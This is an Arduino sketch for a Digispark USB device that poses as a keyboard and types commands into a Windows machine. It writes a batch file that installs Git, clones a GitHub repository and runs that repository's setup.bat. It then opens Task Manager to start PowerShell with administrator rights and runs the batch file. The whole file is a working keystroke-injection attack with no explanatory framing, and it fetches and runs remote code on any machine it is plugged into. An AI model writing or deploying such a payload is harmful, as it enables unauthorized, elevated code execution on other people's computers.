#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT);  //LED on Model A
}

void loop() {

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(6000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  
  DigiKeyboard.delay(500);
  DigiKeyboard.println("notepad"); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 

  DigiKeyboard.delay(1000);
  DigiKeyboard.println("winget install Git.Git");
  DigiKeyboard.println("$env:path = $env:path + \";C:\\Program Files\\Git\\bin\\;C:\\Program Files\\Git\\cmd\\\"");
  DigiKeyboard.println("git clone https://github.com/A1ncrad/setup.git");
  DigiKeyboard.println("cd setup");
  DigiKeyboard.println("./setup.bat");

  DigiKeyboard.sendKeyStroke(KEY_S, MOD_CONTROL_LEFT);  
  DigiKeyboard.delay(500);
  DigiKeyboard.println("start.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(500);

  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.println("cd ([Environment]::GetFolderPath(\"Desktop\"))");
  DigiKeyboard.println("./start.bat");

  digitalWrite(1, HIGH);  //turn on led when program finishes
  DigiKeyboard.delay(9000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}